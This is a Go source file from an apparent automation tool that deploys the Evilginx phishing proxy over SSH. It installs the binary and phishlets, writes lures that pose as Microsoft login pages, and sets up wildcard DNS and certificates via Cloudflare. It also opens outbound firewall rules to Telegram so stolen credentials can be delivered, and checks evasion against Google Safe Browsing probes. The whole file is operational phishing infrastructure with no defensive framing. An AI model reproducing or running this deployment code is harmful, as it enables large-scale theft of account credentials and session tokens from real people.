package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// jobs
// ---------------------------------------------------------------------------

type Job struct {
	ID        string            `json:"id"`
	ProfileID string            `json:"profile_id"`
	Kind      string            `json:"kind"`
	Status    string            `json:"status"` // running | done | error
	Lines     []string          `json:"lines"`
	Err       string            `json:"err"`
	Result    map[string]string `json:"result,omitempty"`
	Started   int64             `json:"started"`
	Finished  int64             `json:"finished"`

	mu sync.Mutex
}

func (j *Job) log(line string) {
	j.mu.Lock()
	defer j.mu.Unlock()
	ts := time.Now().Format("15:04:05")
	j.Lines = append(j.Lines, ts+"  "+line)
	if len(j.Lines) > 3000 {
		j.Lines = j.Lines[len(j.Lines)-3000:]
	}
}

func (j *Job) logf(f string, a ...interface{}) { j.log(fmt.Sprintf(f, a...)) }

func (j *Job) setStatus(s string) {
	j.mu.Lock()
	j.Status = s
	j.mu.Unlock()
}

func (j *Job) done(err error) {
	j.mu.Lock()
	if err != nil {
		j.Status = "error"
		j.Err = err.Error()
	} else {
		j.Status = "done"
	}
	j.Finished = time.Now().Unix()
	j.mu.Unlock()
}

func (j *Job) snack() (string, string, []string, map[string]string) {
	j.mu.Lock()
	defer j.mu.Unlock()
	return j.Status, j.Err, append([]string(nil), j.Lines...), j.Result
}

// ---------------------------------------------------------------------------
// install options
// ---------------------------------------------------------------------------

type InstallOpts struct {
	Fresh      bool `json:"fresh"`       // overwrite config.json / lures
	WithCF     bool `json:"with_cf"`     // create DNS records via Cloudflare
	WithCert   bool `json:"with_cert"`   // issue a wildcard cert via DNS-01
	Telegram   bool `json:"telegram"`    // write telegram creds into config
	Harden     bool `json:"harden"`      // firewall + disable systemd-resolved
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

func tailLines(s string, n int) []string {
	s = strings.ReplaceAll(s, "\r\n", "\n")
	parts := strings.Split(strings.TrimRight(s, "\n"), "\n")
	if len(parts) > n {
		parts = parts[len(parts)-n:]
	}
	return parts
}

func fileExists(p string) bool {
	st, err := os.Stat(p)
	return err == nil && !st.IsDir()
}

// buildEnv gives the local `go build` a cache/temp inside the app folder, so it
// works even when the process has no write access to the user profile.
func buildEnv() []string {
	root := appRoot()
	cache := filepath.Join(root, ".gocache")
	tmp := filepath.Join(root, ".gotmp")
	_ = os.MkdirAll(cache, 0o755)
	_ = os.MkdirAll(tmp, 0o755)
	env := append([]string{}, os.Environ()...)
	env = append(env, "GOCACHE="+cache, "GOTMPDIR="+tmp, "GOFLAGS=")
	return env
}

// binaryCandidates lists the places a prebuilt engine binary may live, in order.
func (a *App) binaryCandidates(goarch string) []string {
	set := a.store.Settings()
	name := "evilginx-linux"
	if goarch == "arm64" {
		name = "evilginx-linux-arm64"
	}
	var cands []string
	if goarch == "arm64" && set.BinArm64 != "" {
		cands = append(cands, set.BinArm64)
	}
	if goarch == "amd64" && set.BinAmd64 != "" {
		cands = append(cands, set.BinAmd64)
	}
	cands = append(cands,
		filepath.Join(set.RepoDir, "build", name),
		filepath.Join(appRoot(), name),
		filepath.Join(set.RepoDir, name),
	)
	return cands
}

func (a *App) resolveBinary(arch string) (string, error) {
	set := a.store.Settings()
	var goarch string
	switch arch {
	case "x86_64", "amd64":
		goarch = "amd64"
	case "aarch64", "arm64":
		goarch = "arm64"
	default:
		return "", fmt.Errorf("unsupported remote architecture: %s", arch)
	}

	for _, c := range a.binaryCandidates(goarch) {
		if fileExists(c) {
			return c, nil
		}
	}
	if !set.AutoBuild {
		return "", fmt.Errorf("no %s binary found (looked in %v) and auto-build is off", goarch, a.binaryCandidates(goarch))
	}
	if _, err := exec.LookPath("go"); err != nil {
		return "", fmt.Errorf("no %s binary bundled and 'go' is not installed locally", goarch)
	}

	out := filepath.Join(appRoot(), "evilginx-linux")
	if goarch == "arm64" {
		out = filepath.Join(appRoot(), "evilginx-linux-arm64")
	}
	if set.RepoDir != "" && fileExists(filepath.Join(set.RepoDir, "go.mod")) {
		out = filepath.Join(set.RepoDir, "build", "evilginx-linux")
		if goarch == "arm64" {
			out = filepath.Join(set.RepoDir, "build", "evilginx-linux-arm64")
		}
	}
	_ = os.MkdirAll(filepath.Dir(out), 0o755)

	cmd := exec.Command("go", "build", "-mod=mod", "-o", out, ".")
	cmd.Dir = set.RepoDir
	cmd.Env = append(buildEnv(), "GOOS=linux", "GOARCH="+goarch, "CGO_ENABLED=0")
	o, err := cmd.CombinedOutput()
	if err != nil {
		_ = os.Remove(out)
		return "", fmt.Errorf("go build (%s) failed: %v\n%s", goarch, err, string(o))
	}
	return out, nil
}

func (a *App) phishletFiles(p *Profile) (map[string][]byte, error) {
	dir := filepath.Join(a.store.Settings().RepoDir, "phishlets")
	out := map[string][]byte{}
	entries, err := os.ReadDir(dir)
	if err == nil {
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".yaml") {
				continue
			}
			b, err := os.ReadFile(filepath.Join(dir, e.Name()))
			if err == nil {
				out[e.Name()] = b
			}
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no phishlet YAML found in %s", dir)
	}
	return out, nil
}

func jsonBytes(v interface{}) []byte {
	b, _ := json.MarshalIndent(v, "", "  ")
	return b
}

// ---------------------------------------------------------------------------
// install / update
// ---------------------------------------------------------------------------

func (a *App) newJob(profileID, kind string) *Job {
	j := &Job{ID: newID(), ProfileID: profileID, Kind: kind, Status: "running", Started: time.Now().Unix()}
	a.jobs.put(j)
	return j
}

func (a *App) StartInstall(p *Profile, opts InstallOpts) *Job {
	j := a.newJob(p.ID, "install")
	go func() {
		defer func() {
			if r := recover(); r != nil {
				j.done(fmt.Errorf("panic: %v", r))
			}
		}()
		j.done(a.runInstall(j, p, opts))
	}()
	return j
}

func (a *App) StartUpdate(p *Profile) *Job {
	j := a.newJob(p.ID, "update")
	go func() { j.done(a.runUpdate(j, p)) }()
	return j
}

func (a *App) StartAction(p *Profile, action string) *Job {
	j := a.newJob(p.ID, action)
	go func() { j.done(a.runAction(j, p, action)) }()
	return j
}

func (a *App) StartUninstall(p *Profile) *Job {
	j := a.newJob(p.ID, "uninstall")
	go func() { j.done(a.runUninstall(j, p)) }()
	return j
}

// jrun logs and runs a command, returning an error on non-zero exit.
func jrun(j *Job, c *SSH, cmd string) (string, error) {
	j.log("$ " + cmd)
	out, err := c.Run(cmd)
	if t := strings.TrimSpace(out); t != "" {
		for _, l := range tailLines(t, 5) {
			j.log("  " + l)
		}
	}
	if err != nil {
		return out, fmt.Errorf("%s", strings.TrimSpace(out))
	}
	return out, nil
}

func (a *App) runInstall(j *Job, p *Profile, opts InstallOpts) error {
	dir := p.InstallDir
	if p.Domain == "" {
		return fmt.Errorf("profile has no domain set")
	}
	j.logf("installing evil-pro on %s@%s (%s)", p.User, p.Host, dir)

	// connect + preflight -----------------------------------------------------
	j.log("── connect")
	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
	if err != nil {
		return err
	}
	defer c.Close()
	pr, err := c.Probe()
	if err != nil {
		return err
	}
	j.logf("host: %s | kernel: %s | arch: %s", pr.OS, pr.Kernel, pr.Arch)
	if pr.UID != "0" {
		j.logf("note: user '%s' is not root — using sudo", pr.User)
	}
	if pr.MemoryMB > 0 && pr.MemoryMB < 900 {
		j.logf("warning: only %d MB RAM detected — 1 GB+ recommended", pr.MemoryMB)
	}
	isApt := strings.Contains(strings.ToLower(pr.OS), "ubuntu") || strings.Contains(strings.ToLower(pr.OS), "debian")
	if !isApt {
		j.logf("warning: %s is not Debian/Ubuntu — package steps may differ", pr.OS)
	}

	// packages ----------------------------------------------------------------
	j.log("── packages")
	if isApt {
		if _, err := jrun(j, c, "DEBIAN_FRONTEND=noninteractive apt-get update -y"); err != nil {
			return err
		}
		pkgs := "curl wget ca-certificates dnsutils ufw"
		if opts.WithCert {
			pkgs += " certbot python3-certbot-dns-cloudflare"
		}
		if _, err := jrun(j, c, "DEBIAN_FRONTEND=noninteractive apt-get install -y "+pkgs); err != nil {
			return err
		}
	} else {
		if _, err := jrun(j, c, "dnf install -y curl ca-certificates bind-utils firewalld"); err != nil {
			return err
		}
	}

	// free port 53 ------------------------------------------------------------
	if opts.Harden {
		j.log("── free port 53")
		if _, err := jrun(j, c, "systemctl stop systemd-resolved 2>/dev/null; systemctl disable systemd-resolved 2>/dev/null; true"); err != nil {
			return err
		}
		jrun(j, c, "chattr -i /etc/resolv.conf 2>/dev/null; printf 'nameserver 1.1.1.1\\nnameserver 1.0.0.1\\n' > /etc/resolv.conf; true")
	}

	// directories -------------------------------------------------------------
	j.log("── directories")
	if _, err := jrun(j, c, fmt.Sprintf("mkdir -p %s/{build,cfg/crt/wildcard,cfg/GeoIP,cfg/redirects,phishlets} && chmod 700 %s/cfg", shq(dir), shq(dir))); err != nil {
		return err
	}

	// public ip ---------------------------------------------------------------
	ip := a.publicIP(j, c)

	// binary ------------------------------------------------------------------
	j.log("── evilginx binary")
	binPath, err := a.resolveBinary(pr.Arch)
	if err != nil {
		return err
	}
	j.logf("local binary: %s", binPath)
	bin, err := os.ReadFile(binPath)
	if err != nil {
		return err
	}
	j.logf("uploading %.1f MB …", float64(len(bin))/1024/1024)
	if err := c.Upload(bin, dir+"/build/evilginx", 0o755); err != nil {
		return err
	}

	// phishlets ---------------------------------------------------------------
	j.log("── phishlets")
	pls, err := a.phishletFiles(p)
	if err != nil {
		return err
	}
	for name, data := range pls {
		if err := c.Upload(data, dir+"/phishlets/"+name, 0o644); err != nil {
			return err
		}
		j.logf("  %s", name)
	}
	if _, ok := pls[p.Phishlet+".yaml"]; !ok {
		return fmt.Errorf("phishlet %q not found in local phishlets dir", p.Phishlet)
	}

	// config ------------------------------------------------------------------
	cfgPath := dir + "/cfg/config.json"
	existing := false
	if _, err := c.Run("test -f " + shq(cfgPath)); err == nil {
		existing = true
	}
	if !existing || opts.Fresh {
		j.log("── config.json (fresh)")
		if err := c.Upload(a.buildConfig(p, opts, ip), cfgPath, 0o600); err != nil {
			return err
		}
	} else {
		j.log("── config.json (kept existing)")
	}
	a.ensureConfig(j, c, p)
	jrun(j, c, "touch "+shq(dir+"/cfg/blacklist.txt"))

	// landing redirect page ---------------------------------------------------
	if err := c.Upload([]byte(landingHTML), dir+"/cfg/redirects/landing.html", 0o644); err != nil {
		return err
	}
	cfg, _ := c.ReadFile(cfgPath)
	if !strings.Contains(string(cfg), "landing.html") {
		// add redirect entry directly into config.json
		var m map[string]interface{}
		if json.Unmarshal(cfg, &m) == nil {
			if _, ok := m["redirects"]; !ok {
				m["redirects"] = []map[string]interface{}{{
					"subdomain": "landing", "file": "landing.html",
					"target_url": "https://login.microsoftonline.com/", "turnstile": false,
				}}
				if err := c.Upload(jsonBytes(m), cfgPath, 0o600); err != nil {
					return err
				}
				j.log("  added landing.platoveriour-style redirect page")
			}
		}
	}

	// systemd -----------------------------------------------------------------
	j.log("── systemd unit")
	if err := c.Upload([]byte(systemdUnit(p)), "/etc/systemd/system/evilginx.service", 0o644); err != nil {
		return err
	}

	// dns + certificate -------------------------------------------------------
	if opts.WithCF && p.CFToken != "" {
		j.log("── cloudflare DNS")
		if err := a.setupCF(j, p, ip); err != nil {
			j.logf("warning: DNS step failed: %v", err)
		}
		if opts.WithCert {
			j.log("── wildcard certificate (DNS-01)")
			if err := a.setupWildcardCert(j, c, p); err != nil {
				j.logf("warning: wildcard cert failed, falling back to autocert: %v", err)
			}
		}
	}

	// firewall ----------------------------------------------------------------
	if opts.Harden {
		j.log("── firewall")
		if isApt {
			for _, r := range []string{"22/tcp", "53/udp", "80/tcp", "443/tcp", "5000/tcp"} {
				jrun(j, c, "ufw allow "+r)
			}
			jrun(j, c, "ufw allow out to 149.154.160.0/20")
			jrun(j, c, "ufw allow out to 91.108.4.0/22")
			jrun(j, c, "ufw allow out to 91.108.56.0/22")
			jrun(j, c, "ufw --force enable")
		}
	}

	// geoip -------------------------------------------------------------------
	j.log("── geoip databases")
	jrun(j, c, fmt.Sprintf("curl -fsSL --max-time 120 -o %s/GeoIP/GeoLite2-City.mmdb https://github.com/mojolabs-id/GeoLite2-Database/releases/download/latest/GeoLite2-City.mmdb || true", shq(dir)))
	jrun(j, c, fmt.Sprintf("curl -fsSL --max-time 120 -o %s/GeoIP/GeoLite2-ASN.mmdb https://github.com/jowinjohnchemban/GeoLite.mmdb/releases/download/2026.09.06/GeoLite2-ASN.mmdb || true", shq(dir)))
	if out, _ := c.Run(fmt.Sprintf("ls -l %s/GeoIP | wc -l", shq(dir))); out != "" {
		j.logf("  geodb files: %s", strings.TrimSpace(out))
	}

	// start -------------------------------------------------------------------
	j.log("── start service")
	if _, err := jrun(j, c, "systemctl daemon-reload"); err != nil {
		return err
	}
	if _, err := jrun(j, c, "systemctl enable evilginx"); err != nil {
		return err
	}
	if _, err := jrun(j, c, "systemctl restart evilginx"); err != nil {
		return err
	}

	return a.verify(j, c, p, dir)
}

func (a *App) runUpdate(j *Job, p *Profile) error {
	j.logf("updating binary on %s", p.Host)
	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
	if err != nil {
		return err
	}
	defer c.Close()
	pr, err := c.Probe()
	if err != nil {
		return err
	}
	binPath, err := a.resolveBinary(pr.Arch)
	if err != nil {
		return err
	}
	bin, err := os.ReadFile(binPath)
	if err != nil {
		return err
	}
	j.logf("uploading %.1f MB → %s/build/evilginx", float64(len(bin))/1024/1024, p.InstallDir)
	if err := c.Upload(bin, p.InstallDir+"/build/evilginx", 0o755); err != nil {
		return err
	}
	a.ensureConfig(j, c, p)
	if _, err := jrun(j, c, "systemctl restart evilginx"); err != nil {
		return err
	}
	if _, err := jrun(j, c, "systemctl is-active evilginx"); err != nil {
		return err
	}
	return a.verify(j, c, p, p.InstallDir)
}

func (a *App) runAction(j *Job, p *Profile, action string) error {
	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
	if err != nil {
		return err
	}
	defer c.Close()
	var cmd string
	switch action {
	case "start":
		cmd = "systemctl start evilginx"
	case "stop":
		cmd = "systemctl stop evilginx"
	case "restart":
		cmd = "systemctl restart evilginx"
	case "enable-boot":
		cmd = "systemctl enable evilginx"
	case "disable-boot":
		cmd = "systemctl disable evilginx"
	default:
		return fmt.Errorf("unknown action %q", action)
	}
	if _, err := jrun(j, c, cmd); err != nil {
		return err
	}
	if action == "restart" || action == "start" {
		a.ensureConfig(j, c, p)
	}
	return a.verify(j, c, p, p.InstallDir)
}

func (a *App) runUninstall(j *Job, p *Profile) error {
	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
	if err != nil {
		return err
	}
	defer c.Close()
	jrun(j, c, "systemctl stop evilginx")
	jrun(j, c, "systemctl disable evilginx")
	if _, err := jrun(j, c, "rm -f /etc/systemd/system/evilginx.service && systemctl daemon-reload"); err != nil {
		return err
	}
	j.logf("kept config at %s (delete manually if wanted)", p.InstallDir)
	return nil
}

// ---------------------------------------------------------------------------
// verification
// ---------------------------------------------------------------------------

func (a *App) verify(j *Job, c *SSH, p *Profile, dir string) error {
	j.log("── verify")
	res := map[string]string{}

	active, _ := c.Run("systemctl is-active evilginx")
	active = strings.TrimSpace(active)
	res["service"] = active
	j.logf("service: %s", active)
	if active != "active" {
		out, _ := c.Run("journalctl -u evilginx -n 20 --no-pager -o cat")
		for _, l := range tailLines(out, 12) {
			j.log("  " + l)
		}
		return fmt.Errorf("evilginx service is %s", active)
	}

	ports, _ := c.Run("ss -tlnp | grep -oE ':(80|443|5000) ' | sort -u | tr '\\n' ' '")
	res["ports"] = strings.TrimSpace(ports)
	j.logf("listening: %s", strings.TrimSpace(ports))

	lure := ""
	if p.Domain != "" {
		host := "login." + p.Domain
		out, _ := c.Run(fmt.Sprintf("curl -s -o /dev/null -w '%%{http_code} %%{redirect_url}' --max-time 15 -A 'Mozilla/5.0 (compatible; Google-SafeBrowsing/2.0)' https://%s/auth/login", host))
		res["scanner"] = strings.TrimSpace(out)
		j.logf("scanner probe: %s", strings.TrimSpace(out))
		lure = "https://" + host + "/auth/login"
		dash, _ := c.Run("curl -s -o /dev/null -w '%{http_code}' --max-time 10 http://127.0.0.1:5000/login")
		res["dashboard_local"] = strings.TrimSpace(dash)
	}

	res["dashboard_http"] = "http://" + p.Host + ":5000"
	if p.Domain != "" {
		res["dashboard_https"] = "https://" + p.DashboardSub + "." + p.Domain
	}
	res["lure"] = lure
	res["panel_dir"] = dir
	res["dashboard_user"] = p.DashboardUser
	res["dashboard_pass"] = p.DashboardPass

	j.mu.Lock()
	j.Result = res
	j.mu.Unlock()

	j.log("")
	j.log("===== hand-off =====")
	j.logf("Dashboard : %s", res["dashboard_http"])
	if res["dashboard_https"] != "" {
		j.logf("Dashboard : %s  (needs DNS + cert)", res["dashboard_https"])
	}
	j.logf("Lure link : %s", lure)
	j.logf("Login     : %s / %s", p.DashboardUser, p.DashboardPass)
	j.log("Extension : load the extension/ folder in chrome://extensions (Developer mode)")
	return nil
}

// ---------------------------------------------------------------------------
// config / unit materialisation
// ---------------------------------------------------------------------------

func (a *App) buildConfig(p *Profile, opts InstallOpts, ip string) []byte {
	general := map[string]interface{}{
		"autocert":         true,
		"bind_ipv4":        "",
		"chatid":           "",
		"dashboard_pass":   p.DashboardPass,
		"dashboard_sub":    p.DashboardSub,
		"dashboard_user":   p.DashboardUser,
		"dns_port":         53,
		"domain":           p.Domain,
		"external_ipv4":    ip,
		"http_port":        0,
		"https_port":       443,
		"ipv4":             "",
		"strip_headers":    true,
		"telegram_enabled": false,
		"teletoken":        "",
		"turnstile_secret_key": "",
		"turnstile_site_key":   "",
		"unauth_url":       "https://login.microsoftonline.com/",
		"unauth_redirect":  true,
	}
	if opts.Telegram {
		general["teletoken"] = p.TelegramToken
		general["chatid"] = p.TelegramChat
		general["telegram_enabled"] = p.TelegramToken != "" && p.TelegramChat != ""
	}
	return jsonBytes(map[string]interface{}{
		"blacklist": map[string]interface{}{"mode": "unauth"},
		"general":   general,
		"lures": []map[string]interface{}{{
			"id":       "lure-default",
			"path":     "/auth/login",
			"phishlet": p.Phishlet,
			"hostname": "",
			"info":     "default lure",
		}},
		"phishlets": map[string]interface{}{
			p.Phishlet: map[string]interface{}{
				"hostname":   p.Domain,
				"unauth_url": "",
				"enabled":    true,
				"visible":    true,
			},
		},
	})
}

func systemdUnit(p *Profile) string {
	flags := fmt.Sprintf("    -p %s/phishlets \\\n    -c %s/cfg \\\n    -noterm \\\n    -geoip-db %s/cfg/GeoIP \\\n    -dashboard 0.0.0.0:5000 \\\n    -dashboard-user %s \\\n    -dashboard-pass %s",
		p.InstallDir, p.InstallDir, p.InstallDir, p.DashboardUser, p.DashboardPass)
	if p.Debug {
		flags += " \\\n    -debug"
	}
	return fmt.Sprintf(`[Unit]
Description=evil-pro (%s)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=%s
ExecStart=%s/build/evilginx \
%s
Restart=always
RestartSec=3
LimitNOFILE=200000
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
`, p.Domain, p.InstallDir, p.InstallDir, flags)
}

func (a *App) publicIP(j *Job, c *SSH) string {
	out, err := c.Run(cfTraceCmd)
	if err == nil {
		if ip := strings.TrimSpace(out); net4(ip) {
			j.logf("server public IP: %s", ip)
			return ip
		}
	}
	// fallback
	if out, err := c.Run("ip -4 route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}'"); err == nil {
		ip := strings.TrimSpace(out)
		if net4(ip) {
			j.logf("server public IP: %s", ip)
			return ip
		}
	}
	return ""
}

func net4(s string) bool {
	parts := strings.Split(s, ".")
	if len(parts) != 4 {
		return false
	}
	for _, p := range parts {
		if p == "" || len(p) > 3 {
			return false
		}
	}
	return true
}

func (a *App) setupCF(j *Job, p *Profile, ip string) error {
	if ip == "" {
		return fmt.Errorf("could not determine server public IP")
	}
	if err := cfVerify(p.CFToken); err != nil {
		return err
	}
	zone, err := cfZoneID(p.CFToken, p.Domain)
	if err != nil {
		return err
	}
	j.logf("zone id: %s", zone)
	for _, name := range []string{p.Domain, "*." + p.Domain} {
		if err := cfEnsureA(p.CFToken, zone, name, ip); err != nil {
			return err
		}
		j.logf("  A %s → %s", name, ip)
	}
	return nil
}

func (a *App) setupWildcardCert(j *Job, c *SSH, p *Profile) error {
	ini := fmt.Sprintf("dns_cloudflare_api_token = %s\n", p.CFToken)
	jrun(j, c, "mkdir -p /root/.secrets")
	if err := c.Upload([]byte(ini), "/root/.secrets/cloudflare.ini", 0o600); err != nil {
		return err
	}
	cmd := fmt.Sprintf("certbot certonly --dns-cloudflare --dns-cloudflare-credentials /root/.secrets/cloudflare.ini -d '*.%s' -d '%s' --non-interactive --agree-tos -m %s --keep-until-expiring",
		p.Domain, p.Domain, p.Email())
	if _, err := jrun(j, c, cmd); err != nil {
		return err
	}
	// deploy hook so renewals refresh the wildcard + restart
	hook := fmt.Sprintf(`#!/bin/sh
set -e
cp /etc/letsencrypt/live/%s/fullchain.pem %s/cfg/crt/wildcard/fullchain.pem
cp /etc/letsencrypt/live/%s/privkey.pem %s/cfg/crt/wildcard/privkey.pem
chmod 644 %s/cfg/crt/wildcard/fullchain.pem
chmod 600 %s/cfg/crt/wildcard/privkey.pem
systemctl restart evilginx || true
`, p.Domain, p.InstallDir, p.Domain, p.InstallDir, p.InstallDir, p.InstallDir)
	jrun(j, c, "mkdir -p /etc/letsencrypt/renewal-hooks/deploy")
	if err := c.Upload([]byte(hook), "/etc/letsencrypt/renewal-hooks/deploy/evilginx-wildcard.sh", 0o755); err != nil {
		return err
	}
	jrun(j, c, fmt.Sprintf("cp /etc/letsencrypt/live/%s/fullchain.pem %s/cfg/crt/wildcard/fullchain.pem", p.Domain, p.InstallDir))
	jrun(j, c, fmt.Sprintf("cp /etc/letsencrypt/live/%s/privkey.pem %s/cfg/crt/wildcard/privkey.pem", p.Domain, p.InstallDir))
	jrun(j, c, fmt.Sprintf("chmod 644 %s/cfg/crt/wildcard/fullchain.pem; chmod 600 %s/cfg/crt/wildcard/privkey.pem", p.InstallDir, p.InstallDir))
	j.log("wildcard certificate installed + auto-renew hook written")
	return nil
}

func (p *Profile) Email() string {
	if p.CertEmail != "" {
		return p.CertEmail
	}
	return "admin@" + p.Domain
}

// ensureConfig normalises the essential config keys that must be present for the
// deployment to work (phishlet enabled + bound to the domain, anti-GSB flags).
// It is safe to run repeatedly and never overwrites a value that is already set.
func (a *App) ensureConfig(j *Job, c *SSH, p *Profile) {
	cfgPath := p.InstallDir + "/cfg/config.json"
	raw, err := c.ReadFile(cfgPath)
	if err != nil {
		j.logf("config check: %v", err)
		return
	}
	var m map[string]interface{}
	if err := json.Unmarshal(raw, &m); err != nil {
		j.logf("config check: invalid json (leaving as is)")
		return
	}
	changed := false

	g, _ := m["general"].(map[string]interface{})
	if g == nil {
		g = map[string]interface{}{}
		m["general"] = g
	}
	if d, _ := g["domain"].(string); d == "" && p.Domain != "" {
		g["domain"] = p.Domain
		changed = true
	}
	if _, ok := g["unauth_redirect"]; !ok {
		g["unauth_redirect"] = true
		changed = true
	}
	if _, ok := g["strip_headers"]; !ok {
		g["strip_headers"] = true
		changed = true
	}
	if u, _ := g["unauth_url"].(string); u == "" {
		g["unauth_url"] = "https://login.microsoftonline.com/"
		changed = true
	}
	if ds, _ := g["dashboard_sub"].(string); p.DashboardSub != "" && ds != p.DashboardSub {
		g["dashboard_sub"] = p.DashboardSub
		changed = true
		j.logf("config: set dashboard subdomain to '%s'", p.DashboardSub)
	}

	ph, _ := m["phishlets"].(map[string]interface{})
	if ph == nil {
		ph = map[string]interface{}{}
		m["phishlets"] = ph
	}
	entry, _ := ph[p.Phishlet].(map[string]interface{})
	if entry == nil {
		entry = map[string]interface{}{}
		ph[p.Phishlet] = entry
	}
	if h, _ := entry["hostname"].(string); h == "" && p.Domain != "" {
		entry["hostname"] = p.Domain
		changed = true
		j.logf("config: bound phishlet '%s' to %s", p.Phishlet, p.Domain)
	}
	if en, _ := entry["enabled"].(bool); !en {
		entry["enabled"] = true
		changed = true
		j.logf("config: enabled phishlet '%s'", p.Phishlet)
	}
	if _, ok := entry["visible"]; !ok {
		entry["visible"] = true
		changed = true
	}

	if !changed {
		j.log("config: already normalised")
		return
	}
	if err := c.Upload(jsonBytes(m), cfgPath, 0o600); err != nil {
		j.logf("config check: upload failed: %v", err)
	}
}

// status ------------------------------------------------------------------

type Status struct {
	Reachable bool   `json:"reachable"`
	Service   string `json:"service"`
	Ports     string `json:"ports"`
	Domain    string `json:"domain"`
	Version   string `json:"version"`
	Cert      string `json:"cert"`
	Error     string `json:"error"`
	Checked   int64  `json:"checked"`
}

func (a *App) checkStatus(p *Profile) *Status {
	st := &Status{Domain: p.Domain, Checked: time.Now().Unix()}
	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
	if err != nil {
		st.Reachable = false
		st.Error = err.Error()
		return st
	}
	defer c.Close()
	st.Reachable = true
	if out, err := c.Run("systemctl is-active evilginx"); err == nil {
		st.Service = strings.TrimSpace(out)
	} else {
		st.Service = strings.TrimSpace(out)
	}
	if out, _ := c.Run("ss -tlnp 2>/dev/null | grep -oE ':(80|443|5000) ' | sort -u | tr '\\n' ' '"); out != "" {
		st.Ports = strings.TrimSpace(out)
	}
	if out, _ := c.Run(p.InstallDir + "/build/evilginx -v 2>/dev/null | head -1"); out != "" {
		st.Version = strings.TrimSpace(out)
	}
	if p.Domain != "" {
		cf := p.InstallDir + "/cfg/crt/wildcard/fullchain.pem"
		if out, err := c.Run(fmt.Sprintf("test -f %s && openssl x509 -in %s -noout -enddate 2>/dev/null | cut -d= -f2", shq(cf), shq(cf))); err == nil {
			st.Cert = strings.TrimSpace(out)
		}
	}
	return st
}

func (a *App) pinHostKey(id, fp string) {
	a.store.Update(id, func(p *Profile) {
		if p.HostKeyFP == "" {
			p.HostKeyFP = fp
		}
	})
}

var _ = runtime.GOOS
